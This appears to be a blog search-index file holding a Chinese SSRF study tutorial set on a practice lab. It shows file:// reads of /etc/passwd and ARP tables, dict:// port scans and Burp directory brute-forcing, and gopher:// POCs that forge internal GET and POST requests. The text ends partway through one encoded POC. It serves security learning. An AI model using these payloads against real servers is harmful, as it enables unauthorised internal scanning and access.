<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SSRF学习</title>
    <link href="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>学习网站</strong></p><blockquote><p>**橙子科技：**<a href="https://www.bilibili.com/video/BV1iQ4y1u7Pt/?spm_id_from=333.1387.homepage.video_card.click&vd_source=525a280615063349bad5e187f6bfeec3">https://www.bilibili.com/video/BV1iQ4y1u7Pt/?spm_id_from=333.1387.homepage.video_card.click&amp;vd_source=525a280615063349bad5e187f6bfeec3</a></p><p>**靶场：**<a href="http://121.43.53.23:9091/">http://121.43.53.23:9091/</a></p></blockquote><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><h3 id="什么是NAT"><a href="#什么是NAT" class="headerlink" title="什么是NAT"></a>什么是NAT</h3><p>NAT（Network Address Translation）：网络地址转换，是一种将私有（保留）地址转化为合法 IP 地址的转换技术，通过将一个外部 IP 地址和端口映射到更大的内部 IP 地址来转换 IP 地址</p><p><strong>就是可以将内网 IP 转换成公网 IP，也可以进行端口映射</strong></p><h1 id="初识SSRF"><a href="#初识SSRF" class="headerlink" title="初识SSRF"></a>初识SSRF</h1><h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>SSRF（Server - Side Request Forgery），也就是服务器端请求伪造。简单来说，这是一种安全漏洞，攻击者可以利用这个漏洞让服务器去访问攻击者指定的其他网络资源。就好像攻击者找到了服务器的一个 “小跟班”，能让这个 “小跟班”（服务器）按照自己的意愿去获取别的地方的信息。</p><p><strong>本质上是属于信息泄露漏洞</strong></p><p>举例理解：</p><p>想象服务器是一个有严格门禁的公司大楼，正常情况下，它只会和经过授权的合作伙伴（正常的网络资源）交流。但是因为有 SSRF 漏洞，攻击者就像一个狡猾的骗子，通过某种手段（漏洞），让大楼里的工作人员（服务器）按照自己的指示，去访问一些未经授权的地方（其他网络资源）。</p><h2 id="SSRF的成因"><a href="#SSRF的成因" class="headerlink" title="SSRF的成因"></a>SSRF的成因</h2><p>大部分是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制</p><h2 id="可能出现SSRF的地方"><a href="#可能出现SSRF的地方" class="headerlink" title="可能出现SSRF的地方"></a>可能出现SSRF的地方</h2><ul><li>从指定URL地址获取网页文本内容</li><li>加载指定地址的图片，下载</li><li>百度识图，给出一串URL就能识别出图片</li></ul><h2 id="SSRF攻击方式"><a href="#SSRF攻击方式" class="headerlink" title="SSRF攻击方式"></a>SSRF攻击方式</h2><p>借助主机A来发起SSRF攻击，通过主机A向主机B发起请求，从而获取主机B的一些信息</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422215816202.png" alt="image-20250422215816202"></p><h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>通过服务器A（SSRF服务器）访问A所在内网的其他服务器。</li><li>由SSRF服务器发送http伪协议连接给B服务器</li><li>B服务器回复到SSRF服务器</li><li>SSRF服务器收到回复后会显示内容</li></ul><h2 id="利用案例"><a href="#利用案例" class="headerlink" title="利用案例"></a>利用案例</h2><ul><li>利用file协议读取本地文件</li><li>对服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li><li>攻击运行在内网或本地的应用程序</li><li>对内网web应用进行指纹识别，识别企业内部的资产信息</li><li>攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击</li></ul><h1 id="SSRF学习"><a href="#SSRF学习" class="headerlink" title="SSRF学习"></a>SSRF学习</h1><h2 id="以用SSRF打内网的流程深入学习"><a href="#以用SSRF打内网的流程深入学习" class="headerlink" title="以用SSRF打内网的流程深入学习"></a>以用SSRF打内网的流程深入学习</h2><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><table><thead><tr><th>伪协议</th><th>作用</th></tr></thead><tbody><tr><td><code>file://</code></td><td>从文件系统中获取文件内容，如<code>file:///etc/passwd</code></td></tr><tr><td><code>dict://</code></td><td>字典服务协议，访问字典资源，如 <code>dict:///ip:6739/info:</code></td></tr><tr><td><code>ftp://</code></td><td>可用于网络端口扫描（效率低一点）</td></tr><tr><td><code>sftp://</code></td><td>SSH文件传输协议或安全文件传输协议</td></tr><tr><td><code>ldap://</code></td><td>轻量级目录访问协议</td></tr><tr><td><code>tftp://</code></td><td>简单文件传输协议</td></tr><tr><td><code>gopher://</code></td><td>分布式文档传递服务</td></tr></tbody></table><h3 id="SSRF信息收集–file伪协议–查找内网存活主机"><a href="#SSRF信息收集–file伪协议–查找内网存活主机" class="headerlink" title="SSRF信息收集–file伪协议–查找内网存活主机"></a>SSRF信息收集–<code>file</code>伪协议–查找内网存活主机</h3><p>**作用：**从文件系统中获取文件内容</p><p><strong>格式：</strong><code>file://[文件路径]</code></p><p><strong>举例：</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>etc/passwd读取文件passwd</span><br><span class="hljs-keyword">file</span>:<span class="hljs-comment">//etc/hosts显示当前操作系统网卡的IP</span><br><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>proc/net/arp显示arp缓存表（寻找内网其他主机）</span><br><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>proc/net/fib_trie显示当前网段路由信息</span><br></code></pre></td></tr></table></figure><h4 id="查找内网存活主机"><a href="#查找内网存活主机" class="headerlink" title="查找内网存活主机"></a>查找内网存活主机</h4><p>如下页面，可以使用<code>file://</code>伪协议读取任意文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422214441451.png" alt="image-20250422214441451"></p><p>可以成功读取到文件，就可以怀疑这个页面存在SSRF漏洞</p><p>然后第一个要考虑的就是这台主机所处的内网网段是多少，可以通过使用<code>file://</code>伪协议读取文件进行查看当前这台存在SSRF漏洞的主机的 IP 获取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422215024277.png" alt="image-20250422215024277"></p><p>可以看到有两个 IP，这表明当前这个服务器存在两个网卡，一个网卡在<code>172.251.251.2</code>这个网段，另一个网卡在<code>172.250.250.2</code>这个网段</p><p>然后我们还可以继续获取<code>ARP</code>缓存表，寻找内网其他主机</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>net/arp<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422221329788.png" alt="image-20250422221329788"></p><p>只读到了三个网站，但是这不代表是所有的主机，只是当前已经使用<code>ARP</code>协议缓存过的</p><p>可以使用<code>ARP</code>协议扫描内网，好处是不关心对方服务器开没开防火墙或开了什么策略，只要是工作在 IP 协议的一个服务器，都可以使用<code>ARP</code>协议扫描出来</p><p>**什么是<code>ARP</code>缓存表：**ARP 缓存表是主机用于缓存 IP 地址与 MAC 地址映射关系的表，只有与其进行通信才会有这个<code>ARP</code>表</p><p><strong>所以可以通过SSRF漏洞去访问内网里的所有 IP，如果主机存活就会被记录在<code>ARP</code>缓存表中，然后使用<code>file://</code>伪协议去读取<code>/proc/net/arp</code>就可以知道有哪些主机是存活的</strong></p><p>如：通过SSRF漏洞去访问<code>http://172.250.250.6/</code>这个网段，当前的SSRF服务器就会去尝试访问这个网站，与其进行通信，但是在与其进行通信之前，这个SSRF服务器会先发送一个 ARP 请求给要访问的网站，然后目标网站不管有没有开防火墙都会有一个简单的应答</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422221309490.png" alt="image-20250422221309490"></p><p>然后再此读取<code>ARP</code>缓存表，就会发现多出了刚才访问的网站</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422221423498.png" alt="image-20250422221423498"></p><p>要人工去一个个访问网站太麻烦，可以使用<code>BurpSuite</code>去访问所有地址</p><p>首先使用bp进行一次抓包</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222040263.png" alt="image-20250422222040263"></p><p>将抓到的请求包发送到</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222305099.png" alt="image-20250422222305099"></p><p>然后在payload中选择类型为数值，定义好范围是1到254，步长为1</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222452166.png" alt="image-20250422222452166"></p><p>接着就可以开始攻击了</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222825575.png" alt="image-20250422222825575"></p><p>最后再去读取<code>ARP</code>缓存表得到扫描的结果</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422223008991.png" alt="image-20250422223008991"></p><p>会发现有的不存活的主机也在里面，可以根据<code>HW address</code>进行区分，如果这部分不全是00的，就是存活的，如果全是00，就是不存活，为0的意思就是向其发送的 ARP 请求，但是目标主机并没有应答，所以该主机是没有存活的</p><h3 id="SSRF信息收集–dict伪协议–查找内网主机开放端口"><a href="#SSRF信息收集–dict伪协议–查找内网主机开放端口" class="headerlink" title="SSRF信息收集–dict伪协议–查找内网主机开放端口"></a>SSRF信息收集–<code>dict</code>伪协议–查找内网主机开放端口</h3><p>**作用：**字典服务协议，访问字典资源，可用于扫描端口、获取内网信息、爆破密码等</p><p><strong>格式：</strong><code>dict://[服务器IP]:[端口]/[字典数据库名称:关键字]</code></p><p><strong>举例：</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">dict:</span>//dict<span class="hljs-meta">.org</span>:<span class="hljs-number">2628</span>/moby-thesaurus:happy<br></code></pre></td></tr></table></figure><ul><li>**<code>dict.org</code>**是字典服务器的地址</li><li>**<code>2628</code>**是端口号</li><li>**<code>moby-thesaurus</code>**是字典数据库的名称</li><li>**<code>happy</code>**是要查询的关键字</li></ul><p>可以使用<code>dict://</code>伪协议查找内网主机开放端口，与其相似的是<code>ftp://</code>伪协议，但是<code>ftp://</code>伪协议效率较低，所以最好使用<code>dict://</code>伪协议</p><h4 id="查找内网主机开放端口"><a href="#查找内网主机开放端口" class="headerlink" title="查找内网主机开放端口"></a>查找内网主机开放端口</h4><p>如下，仍使用bp抓包，添加端口号</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.1:80</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422225838573.png" alt="image-20250422225838573"></p><p>发送到<code>Intruder</code>中</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230035341.png" alt="image-20250422230035341"></p><p>然后是要确定这次的payload由哪些部分组成</p><ul><li>首先是 IP 地址，在前面已经使用<code>file://</code>伪协议获取了存活的主机的 IP 地址，就不用考虑有哪些主机是存活的</li><li>第二个就是端口，这次就是测试有哪些端口开放</li></ul><p>先使用<code>ftp://</code>伪协议进行扫描1到14的IP的80端口</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230503939.png" alt="image-20250422230503939"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230527664.png" alt="image-20250422230527664"></p><p>开始攻击后首先就会发现所需的时间很长，所以不建议使用，可以打开列中的接收到响应和响应完成两个选项判断是否开启了80端口，响应长的都是开启了的</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230933913.png" alt="image-20250422230933913"></p><p>接下来使用<code>dict://</code>伪协议扫描1到14主机，并且检测端口，这里就要选择攻击类型为集束炸弹</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231338387.png" alt="image-20250422231338387"></p><p>第一个payload和前面一样是1到14</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231452206.png" alt="image-20250422231452206"></p><p>第二个payload选择简单列表，并添加一些端口</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231616457.png" alt="image-20250422231616457"></p><p>经过上面的设置就可以扫描1到14这些主机的我们设置好要扫描的端口</p><p>开始攻击，会发现比使用<code>ftp://</code>伪协议快得多</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231900372.png" alt="image-20250422231900372"></p><p>可以通过长度列的数值辨别该主机的端口是否开放，那些数值大的就是开放了的，下面这些就是没有开放，可以看到数值有明显的分界线</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422232121601.png" alt="image-20250422232121601"></p><h4 id="获取网站信息"><a href="#获取网站信息" class="headerlink" title="获取网站信息"></a>获取网站信息</h4><p>后面加入关键字就可以获取网站的信息了，如<code>info</code></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//172.250.250.11:3306/info</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422232905611.png" alt="image-20250422232905611"></p><h3 id="SSRF信息收集–http伪协议–目录扫描"><a href="#SSRF信息收集–http伪协议–目录扫描" class="headerlink" title="SSRF信息收集–http伪协议–目录扫描"></a>SSRF信息收集–<code>http</code>伪协议–目录扫描</h3><p>**作用：**常规 URL 形式，允许通过 HTTP 1.0 的GET方法，以只读访问文件或资源，在CTF中通常用于远程包含</p><p><strong>举例：</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//user:password@example.com</span><br></code></pre></td></tr></table></figure><p>在SSRF中就是利用http伪协议进行<strong>目录扫描</strong></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>接下来对<code>172.250.250.4</code>的<code>80</code>端口进行目录扫描，查看有哪些页面</p><p>首先通过SSRF服务器，使用http伪协议访问这个网站</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422233710257.png" alt="image-20250422233710257"></p><p>依旧使用bp抓包，并放到<code>Intruder</code>中</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422233849976.png" alt="image-20250422233849976"></p><p>构造出子页面</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422234006520.png" alt="image-20250422234006520"></p><p>这里做目录扫描就是将<code>index</code>替换成其他的常见的名词</p><p>payload选择简单列表，这里要加载字典进去，字典可以在kali中获取，文件路径如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/common.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422234630012.png" alt="image-20250422234630012"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422234952423.png" alt="image-20250422234952423"></p><p>然后开始攻击，依旧是根据长度判断目录是否存在</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422235918303.png" alt="image-20250422235918303"></p><p>可以访问看看</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/phpinfo.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423001106200.png" alt="image-20250423001106200"></p><p>如果不确定后缀名，可以再添加一个payload</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423001227898.png" alt="image-20250423001227898"></p><h2 id="SSRF利用–gopher伪协议学习"><a href="#SSRF利用–gopher伪协议学习" class="headerlink" title="SSRF利用–gopher伪协议学习"></a>SSRF利用–gopher伪协议学习</h2><p><code>gopher://</code>伪协议可以理解为<code>http://</code>伪协议的前身</p><p><strong>利用范围：</strong><code>GET提交</code>、<code>POST提交</code>、<code>Redis</code>、<code>Fastcgi</code>、<code>SQL</code></p><p><strong>为什么使用<code>gopher</code>伪协议：</strong></p><ul><li>当需要POST提交时，可以利用<code>gopher</code>伪协议进行POST提交</li><li><code>gopher</code>伪协议还可以对MySQL数据库发起一个未授权认证的攻击时，提交TCP的数据流</li></ul><p><strong>格式：</strong><code>URL:gopger://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></p><p>web也需要加端口号80，<code>gopher</code>协议默认端口为70</p><h3 id="gopher请求不转发第一个字符"><a href="#gopher请求不转发第一个字符" class="headerlink" title="gopher请求不转发第一个字符"></a><code>gopher</code>请求不转发第一个字符</h3><p>开启两个kali交互页面，用其中一个向本地的7777端口发送<code>gopher</code>伪协议请求</p><p>第一个页面监听7777端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423003443809.png" alt="image-20250423003443809"></p><p>另一个页面发送请求</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl gopher<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.0.0.1:7777/abcd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423003424298.png" alt="image-20250423003424298"></p><p>会发现发送的是<code>abcd</code>，但接收到的只有<code>bcd</code></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423003533987.png" alt="image-20250423003533987"></p><p><code>gopher</code>请求不转发第一个字符</p><p>所以在提交的时候要在前面加上一个填充位<code>_</code>，这个填充位是没有意义的，只是为了让对方受到的数据完整</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl gopher<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.0.0.1:7777/_abcd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423004628798.png" alt="image-20250423004628798"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423004637464.png" alt="image-20250423004637464"></p><p>可以看到接收的数据完整了</p><h3 id="简单实验"><a href="#简单实验" class="headerlink" title="简单实验"></a>简单实验</h3><p>在SSRF服务器访问如下页面</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/name.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423004946693.png" alt="image-20250423004946693"></p><p>这个代码是会将GET或POST提交的值回显出来</p><p>首先使用GET提交</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/name.php?name=dazhunag</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423005131168.png" alt="image-20250423005131168"></p><p>然后是POST提交，但是使用<code>http</code>伪协议不能进行POST提交，就算改成POST提交，但只是提交给SSRF这个服务器，SSRF服务器是无法再POST提交给内网主机的</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423005305165.png" alt="image-20250423005305165"></p><p>这就要使用<code>gopher</code>伪协议了，可以使用<code>gopher</code>伪协议提交给SSRF服务器，SSRF服务器接收到提交的内容后，会进行解析，然后可以根据<code>gopher</code>伪协议里定义好的GET或POST方法去决定使用什么方法将数据发送给内网主机</p><h4 id="GET提交"><a href="#GET提交" class="headerlink" title="GET提交"></a>GET提交</h4><p>以下是正常使用GET请求的请求包</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423010222009.png" alt="image-20250423010222009"></p><p><strong>需要保留头部信息</strong></p><ul><li><strong>路径：</strong><code>GET /name.php?name=dazhuang HTTP/1.1</code></li><li><strong>目标IP地址：</strong><code>Host: 172.250.250.4</code></li></ul><p><strong>构造POC</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/name.php?name=dazhuang</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.4<br><br></code></pre></td></tr></table></figure><p><strong>注意：<strong>POC的最后是有一个</strong>换行符</strong>的，换行的上面是头部信息，下面是POST请求内容，还要注意添加<strong>端口号（<code>80</code>）<strong>和</strong>填充位（<code>_</code>）</strong></p><p>最终的POC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.4:80</span>/_GET%<span class="hljs-number">20</span>/name.php%<span class="hljs-number">3</span>fname=dazhuang%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>AHost:%<span class="hljs-number">20172</span>.<span class="hljs-number">250</span>.<span class="hljs-number">250</span>.<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><ul><li>**<code>%20</code>**是空格</li><li>**<code>%3f</code>**是问号<code>?</code></li><li>**<code>%0d%0A</code>**是换行符</li></ul><p>进行提交</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423011020182.png" alt="image-20250423011020182"></p><p>也可以用bp抓包，把构造好的后面的内容放到bp里进行两次URL编码（发送请求时，浏览器会进行一次U人L编码，在将数据发送给SSRF服务器时SSRF服务器会进行一次URL解码，然后SSRF服务器发送给内网主机时内网主机会进行第二次URL解码）</p><p>第一次编码</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423011541207.png" alt="image-20250423011541207"></p><p>第二次编码</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423012316053.png" alt="image-20250423012316053"></p><p>最终结果</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423012342123.png" alt="image-20250423012342123"></p><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><ul><li>问号需要进行URL编码为<code>%3f</code></li><li>回车换行要URL编码为<code>%0d%0a</code></li><li>在HTTP包的最后要加上<code>%0d%0a</code>，代表消息结束</li><li>URL编码改为大写，冒号注意英文冒号</li><li>如果使用bp发包需要进行两次URL编码</li><li>GET提交最后需要增加一个换行符</li></ul><h4 id="POST提交"><a href="#POST提交" class="headerlink" title="POST提交"></a>POST提交</h4><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423013351894.png" alt="image-20250423013351894"></p><p><strong>需要保留头部信息：</strong></p><ul><li>POST</li><li>Host:</li><li>Content-Type:</li><li>Content-Length:</li></ul><p><strong>构造POC</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/name.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.4<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>13<br><br><span class="language-abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>jianjian</span><br></code></pre></td></tr></table></figure><p><strong>注意：</strong><code>Content-Length</code>的值要和实际提交的长度一致，否则你定义的长度多少，最终读取到的就是多少，如：实际是13，定义为11，最终只会读<code>name=jianji</code>，还有就是上传的文件类型也要一致</p><p>可以像前面GET一样，进行两次URL编码，也可以直接使用bp的编码工具进行两次编码</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423013736219.png" alt="image-20250423013736219"></p><p>最终POC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.4:80</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span 